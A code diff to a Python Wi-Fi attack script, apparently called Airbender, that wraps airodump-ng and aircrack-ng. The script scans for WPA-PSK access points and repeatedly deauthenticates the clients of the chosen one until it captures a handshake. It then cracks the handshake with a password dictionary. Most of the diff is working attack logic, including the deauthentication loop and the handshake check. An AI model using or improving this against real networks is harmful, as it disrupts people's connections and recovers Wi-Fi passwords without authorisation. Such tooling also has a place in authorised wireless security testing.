@@ -48,6 +48,7 @@ def main():
 	if not os.geteuid() == 0:
 		sys.exit('Please run as root')
 	try:
+		print(asciiAirEmblem)
 		environmentSetup()
 		# killInterference()
 		while targetBSSID == "" or channel == "":
@@ -236,20 +237,27 @@ def getTargetAccessPoint():
 	# get result of airodump-ng
 	AP_list = scanAccessPoints(interfaceName, channel)
 	
-	# get necessary columns (ESSID/BSSID/power/Authentication) and the max
-	# ESSID width (for formatting later)
+	# get necessary columns (ESSID/BSSID/power/Authentication)
 	ESSID_col = 0
 	BSSID_col = 0
 	power_col = 0
+	channel_col = 0
 	auth_col  = 0
 	max_ESSID_len = 0
 	for i,v in enumerate(AP_list[0]):
-		ESSID_col = i if 'ESSID' in v.strip() else ESSID_col
-		BSSID_col = i if 'BSSID' in v.strip() else BSSID_col
-		power_col = i if 'Power' in v.strip() else power_col
-		auth_col = i if 'Authentication' in v.strip() else auth_col
+		ESSID_col   = i if 'ESSID' in v else ESSID_col
+		BSSID_col   = i if 'BSSID' in v else BSSID_col
+		power_col   = i if 'Power' in v else power_col
+		auth_col    = i if 'Authentication' in v else auth_col
+		channel_col = i if 'channel' in v else channel_col
+	# hidden SSIDs are represented as repeating '\x00' character
+	# replace this sequence with "<hidden>" for cleaner output
+	for line in AP_list:
+		if re.match(r"(\\x00)+", line[ESSID_col].strip()):
+			line[ESSID_col] = "<hidden>"
+	# the max ESSID width (for formatting later)
 	for line in AP_list[1:]:
-		max_ESSID_len = len(line[ESSID_col].strip()) if len(line[ESSID_col].strip()) > max_ESSID_len else max_ESSID_len
+		max_ESSID_len = len(line[ESSID_col]) if len(line[ESSID_col]) > max_ESSID_len else max_ESSID_len
 
 	# filter list for only WPA-PSK authenticated APs
 	AP_list = [line for line in AP_list[1:] if 'PSK' in line[auth_col]]
@@ -257,15 +265,16 @@ def getTargetAccessPoint():
 	# if user specifies an ESSID (name), find out what BSSID it corresponds to
 	if targetESSID != '':
 		for line in AP_list:
-			if line[ESSID_col].strip() == targetESSID:
-				targetBSSID = line[ESSID_col]
+			if line[ESSID_col] == targetESSID:
+				targetBSSID = line[BSSID_col]
+				channel = line[channel_col]
 				return
 	
 	# if ESSID not specified, prompt the user to select an AP
 	print()
-	print("\t      Power  {:{width}} : BSSID".format('ESSID',width=max_ESSID_len))
+	print("\t     Power Chan {:{width}}   BSSID".format('ESSID',width=max_ESSID_len))
 	for i, v in enumerate(AP_list):
-		print("\t[{:2}] {:6} {:{width}} : {}".format(str(i), v[power_col], v[ESSID_col], v[BSSID_col], width=max_ESSID_len))
+		print("\t[{:2}] {:<5} {:<4} {:{width}} : {}".format(str(i), v[power_col], v[channel_col], v[ESSID_col], v[BSSID_col], width=max_ESSID_len))
 	print()
 
 	# Get MAC address of the target access point (router)
@@ -273,7 +282,8 @@ def getTargetAccessPoint():
 	while not (user_input.isdigit() and 0 <= int(user_input) < len(AP_list)):
 		user_input = input("Please select a target access point: ")
 
-	targetBSSID = AP_list[int(user_input)][BSSID_col].strip()
+	targetBSSID = AP_list[int(user_input)][BSSID_col]
+	channel = AP_list[int(user_input)][channel_col]
 
 	print("targetBSSID = " + str(targetBSSID))
 
@@ -312,6 +322,7 @@ def scanAccessPoints(interfaceName, channel='0', scanTime=5):
 	begin = 0
 	end = 0
 	for i, line in enumerate(AP_dump):
+		AP_dump[i] = [elem.strip() for elem in line]
 		if 'BSSID' in line:
 			begin = i
 		if (len(line)==0) and  i>begin:
@@ -405,58 +416,59 @@ def captureHandshake():
 	while not scanTime.isdigit():
 		scanTime = input("Time limit to listen for WPA handshake (seconds): ")
 
-	# TODO: Can't figure out how to read output of airodump for successful
-	# handshake capture. So run it interactively after the deauthentication.
-	print("Starting packet dump of AP: " + targetBSSID)
-	airodump_proc = bash_command("airodump-ng" +
-			" -c " + str(channel) +
-			" --bssid " + str(targetBSSID) +
-			" --output-format cap --output-format csv" +
-			" -w " + packetPath + "packet" +
-			" " + str(interfaceName),
-			stdout=None, 
-			stderr=None,
-			stdin=None)
+	# List all clients connected to target AP
+	# generate airodump command (plus arguments)
+	scan_command = "airodump-ng --output-format cap --output-format csv -w " + packetPath+"packet" + " --bssid " + str(targetBSSID)
+	if int(channel) > 0:
+		scan_command += " -c " + str(channel)
+	scan_command += " " + interfaceName
+	# dump packets to/from target AP
+	# airodump_proc = bash_command(scan_command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+
+	airodump_proc = bash_command(scan_command, stdout=None, stderr=None)
 
 	timeStart = time.time()
-
-	# Deauthenticate clients until a handshake appears in the packet dump
+	# keep scanning until we get a WPA handshake
+	f = open('log.txt','w')
 	while True:
-		client_list = scanClientsAtAccessPoint()
+		# check if we've captured a handshake
+		proc = bash_command("aircrack-ng -w " +dictionaryPath+" " + packetPath+"packet-01.cap", stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+		try:
+			outs, errs = proc.communicate(timeout=1)
+		except TimeoutExpired:
+			proc.kill()
+			outs, errs = proc.communicate()
 
+		if not ('No networks found' in outs.decode('utf-8') or
+				'no data packets from target' in outs.decode('utf-8') or
+				'No valid WPA handshakes' in outs.decode('utf-8')):
+			break
+		# Deauthenticate clients until a handshake appears in the packet dump
+		client_list = scanClientsAtAccessPoint()
 		for client in client_list:
 			deauthenticateClient(client)
-
-		time.sleep(1)
-
 		if time.time()-timeStart > int(scanTime):
 			break
 
-	time.sleep(10)
-	print("Killing packet dump of AP: " + targetBSSID)
+	print("terminating airodump")
 	airodump_proc.terminate()
 
 
-def scanClientsAtAccessPoint(targetESSID=None, scanTime=5):
+def scanClientsAtAccessPoint(scanTime=5):
 	global targetBSSID
+	global targetESSID
 	global channel
 	global interfaceName
 
 	# Allow user to select an AP (access point) by MAC address
-	if targetESSID == None or targetESSID == '':
+	if not targetESSID:
 		print("Scanning clients connected to access point " + targetBSSID + "...")
 	else:
 		print("Scanning clients connected to access point " + targetESSID + "...")
 
-	# List all clients connected to target AP
-	# scanTime = ''
-	# while not scanTime.isdigit():
-	# 	scanTime = input("Time limit to listen for clients (seconds): ")
-	process = bash_command("airodump-ng --output-format csv -c " + channel + " -w " + packetPath+"client" + " --bssid " + str(targetBSSID) + " " + str(interfaceName), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-
 	# wait for airodump to dump client csv list
 	timeStart = time.time()
-	while not os.path.isfile(packetPath+"client-01.csv"):
+	while not os.path.isfile(packetPath+"packet-01.csv"):
 		if time.time()-timeStart > scanTime:
 			print("took too long")
 			break
@@ -465,7 +477,7 @@ def scanClientsAtAccessPoint(targetESSID=None, scanTime=5):
 	time.sleep(int(scanTime))
 
 	# read output csv file for clients
-	with open(packetPath+'client-01.csv') as csvfile:
+	with open(packetPath+'packet-01.csv') as csvfile:
 		client_reader = csv.reader(csvfile, delimiter=',', quotechar='|')
 		client_dump = [line for line in client_reader]
 	# find clients in dump file
@@ -474,21 +486,18 @@ def scanClientsAtAccessPoint(targetESSID=None, scanTime=5):
 			client_dump = client_dump[i+1:]
 			break
 	client_list = [line[0] for line in client_dump if len(line)>0]
-	print("Found clients:")
-
-	process.terminate()
-	if os.path.isfile(packetPath + "client-01.csv"):
-			os.remove(packetPath + "client-01.csv")
+	
 
 	return client_list
 
 
-def deauthenticateClient(clientMacAddress, targetESSID=None):
+def deauthenticateClient(clientMacAddress):
 	global targetBSSID
+	global targetESSID
 	global interfaceName
 	global channel
 
-	if targetESSID == None or targetESSID == '':
+	if not targetESSID:
 		print("Deauthenticating client " + clientMacAddress + " at AP " + targetBSSID)
 	else:
 		print("Deauthenticating client " + clientMacAddress + " at AP " + targetESSID)
@@ -508,6 +517,7 @@ def validMacAddress(address):
 def crackHandshake():
 	global targetBSSID
 	global dictionaryPath
+	global packetPath
 
 	process = bash_command("aircrack-ng -w " + dictionaryPath + " -b " + targetBSSID + " " + packetPath + "packet-01.cap", stdout=None, stderr=None)
 	process.wait()
@@ -517,7 +527,50 @@ def cleanUp():
 	if os.path.exists(packetPath):
 		shutil.rmtree(packetPath)
 
-
+asciiAirEmblem = '''\
+        ***********                    
+    .***                               
+  ,**,                                               d8888 d8b         888                             888                  
+ ***                   .**********                  d88888 Y8P         888                             888                  
+***   ***.  ***       **,        ****              d88P888             888                             888                  
+**   **        **    **   *****    ***            d88P 888 888 888d888 88888b.   .d88b.  88888b.   .d88888  .d88b.  888d888 
+**  ,*   ***   **   **  **    ,**   ***          d88P  888 888 888P"   888 "88b d8P  Y8b 888 "88b d88" 888 d8P  Y8b 888P"   
+**   **    .*  **   **  ** **   **   **         d88P   888 888 888     888  888 88888888 888  888 888  888 88888888 888     
+.**   ******* ,**    **  ***    **   **        d8888888888 888 888     888 d88P Y8b.     888  888 Y88b 888 Y8b.     888     
+  **,        ***     .**       **    **       d88P     888 888 888     88888P"   "Y8888  888  888  "Y88888  "Y8888  888     
+    **********         ,********     **
+                                    ** 
+    *        *****,*****           **  
+    *       **    ,,   **,        **   
+    **     **    ** **  ***     *.     
+    ,*     **    **  **  **            
+     **     **      **   **            
+      ***     *******   **             
+        ***.          ***              
+          ,************                
+'''
+asciiArrowBox = '''\
+###############/*******\###############
+#             #/*******\#             #
+#             (/*******\)             #
+#             (/*******\)             #
+#             (/*******\)             #
+#             (/*******\)             #
+#             (/*******\)             #
+#             #/*******\#             #
+#     \((\\\\\\\\\\\\*********//////))/     #
+#       \((*****************))/       #
+#         \#(*************)#/         #
+#           \#(*********)#/           #
+#             \#(*****)#/             #
+#               \#(*)#/               #
+#                 \#/                 #
+#                                     #
+#                                     #
+#                                     #
+#                                     #
+#######################################
+'''
 if __name__ == "__main__":
 	main()
 
